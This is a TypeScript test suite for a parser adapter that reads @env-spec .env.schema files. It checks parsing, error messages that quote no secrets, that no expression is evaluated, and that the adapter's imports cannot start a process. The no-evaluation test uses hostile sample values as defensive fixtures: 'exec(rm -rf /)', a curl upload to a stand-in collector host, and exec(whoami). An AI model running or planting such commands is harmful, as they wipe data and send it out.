import { describe, expect, it } from "@effect/vitest";
import { EnvSchemaView } from "@repo/protocol/domain/env";
import { LandedSha, ProjectName, RepoPath } from "@repo/protocol/ids";
import { Effect, Schema } from "effect";

import datekit from "../../../examples/datekit/.env.schema?raw";
import { EnvSchemaParser, EnvSchemaUnreadable } from "../src/env-schema.ts";
import { EnvSchemaParserEnvSpec } from "../src/env-schema/env-spec.ts";
import { envSchemaViewOf } from "../src/env-shape.ts";
import { fixtures } from "./fixtures/env/cases.ts";
import expressions from "./fixtures/env/expressions.env.schema?raw";

const project = ProjectName.make("oscabriel/datekit");

const at = LandedSha.make("b2".repeat(20));

const parse = (file: RepoPath, text: string) =>
  Effect.gen(function* () {
    const parser = yield* EnvSchemaParser;

    return yield* parser.parse(file, text);
  }).pipe(Effect.provide(EnvSchemaParserEnvSpec));

const importsOf = (source: string | undefined) =>
  [
    ...(source ?? "").matchAll(
      /(?:\bfrom\s+|\bimport\s*\(\s*|^import\s+)["'](?<specifier>[^"']+)["']/gmu
    ),
  ].map((match) => match.groups?.specifier);

const seam = import.meta.glob(
  ["../src/env-schema.ts", "../src/env-schema/env-spec.ts"],
  { eager: true, import: "default", query: "?raw" }
);

const dist = "../node_modules/@env-spec/parser/dist/";

const parserModules = import.meta.glob(
  ["../node_modules/@env-spec/parser/dist/*.mjs"],
  { eager: true, exhaustive: true, import: "default", query: "?raw" }
);

describe("the /env-spec adapter", () => {
  // The /memory fake holds what this parser reads, so a test over the fake
  // says what the real parser says.
  it.effect.each(fixtures)(
    "reads $file as the fake holds it",
    ({ file, parsed, text }) =>
      Effect.gen(function* () {
        expect(yield* parse(file, text)).toStrictEqual(parsed);
      })
  );

  // datekit: the Sentry token is sensitive, required only in production, and
  // sent only to sentry.io's API; everything else is public.
  it.effect(
    "gives datekit's committed .env.schema the shape the demo shows",
    () =>
      Effect.gen(function* () {
        const file = RepoPath.make(".env.schema");
        const parsed = yield* parse(file, datekit);
        const shown = envSchemaViewOf({ at, file, parsed, project });

        expect(yield* Schema.encodeEffect(EnvSchemaView)(shown)).toStrictEqual({
          at,
          currentEnvKey: "APP_ENV",
          file: ".env.schema",
          imports: [],
          items: [
            {
              key: "APP_ENV",
              required: true,
              sensitive: false,
              tags: [],
              type: "enum(development, test, production)",
            },
            {
              description: "Error reporting DSN. Public: it ships in builds.",
              key: "SENTRY_DSN",
              required: true,
              sensitive: false,
              tags: [],
              type: "url",
            },
            {
              description:
                "Source-map upload token. Release step only; never enters a check.",
              key: "SENTRY_AUTH_TOKEN",
              proxy: { domains: ["sentry.io"], path: "/api/**" },
              required: "depends",
              sensitive: true,
              tags: ["release"],
            },
            {
              description: "Where locale data lives.",
              key: "DATEKIT_LOCALE_DIR",
              required: true,
              sensitive: false,
              tags: [],
            },
          ],
          project: "oscabriel/datekit",
        });
      })
  );

  it.effect(
    "refuses text that is not @env-spec, saying where and quoting none of it",
    () =>
      Effect.gen(function* () {
        const file = RepoPath.make(".env.schema");

        const unreadable = yield* Effect.flip(
          parse(file, "API_KEY=not-a-real-key\n# @x=(\n= hunter2")
        );

        expect(unreadable).toBeInstanceOf(EnvSchemaUnreadable);
        expect(unreadable.file).toBe(file);
        expect(unreadable.reason).toBe(
          "does not parse as @env-spec at line 3, column 1"
        );
      })
  );
});

// The platform parses, never resolves.
describe("the /env-spec adapter never evaluates", () => {
  it.effect(
    "reads $(…) and exec(…) as text, and the shape carries no value",
    () =>
      Effect.gen(function* () {
        const file = RepoPath.make(".env.schema");
        const parsed = yield* parse(file, expressions);

        const shown = yield* Schema.encodeEffect(EnvSchemaView)(
          envSchemaViewOf({ at, file, parsed, project })
        );

        expect(
          parsed.items.map(({ key, value }) => [key, value])
        ).toStrictEqual([
          ["WIPE", "exec(rm -rf /)"],
          ["LEAK", "exec(`curl -s https://collector.example.invalid/upload`)"],
          ["API_KEY", "not-a-real-key-0123456789"],
          ["GREETING", "concat(hello-, exec(whoami))"],
        ]);
        expect(shown.items.map(({ key }) => key)).toStrictEqual([
          "WIPE",
          "LEAK",
          "API_KEY",
          "GREETING",
        ]);

        const text = JSON.stringify(shown);

        for (const value of [
          "rm -rf",
          "curl",
          "collector",
          "whoami",
          "not-a-real-key",
        ]) {
          expect(text).not.toContain(value);
        }
      })
  );

  // Nothing on the adapter's import graph can start a process: the adapter
  // and the seam import only effect, the protocol's ids and the parser; the
  // parser's entry imports only its own chunk, which imports nothing. Its
  // `simple-resolver`, the one module that imports node:child_process, is
  // on no path from the entry.
  it("imports nothing that can start a process", () => {
    expect(
      new Set(importsOf(seam["../src/env-schema/env-spec.ts"]))
    ).toStrictEqual(
      new Set([
        "../env-schema.ts",
        "@env-spec/parser",
        "@repo/protocol/ids",
        "effect",
      ])
    );
    expect(new Set(importsOf(seam["../src/env-schema.ts"]))).toStrictEqual(
      new Set(["@repo/protocol/ids", "effect"])
    );
    expect(importsOf(parserModules[`${dist}index.mjs`])).toStrictEqual([
      "./classes-jsJQRNIl.mjs",
    ]);
    expect(
      importsOf(parserModules[`${dist}classes-jsJQRNIl.mjs`])
    ).toStrictEqual([]);
    expect(importsOf(parserModules[`${dist}simple-resolver.mjs`])).toContain(
      "node:child_process"
    );
  });
});
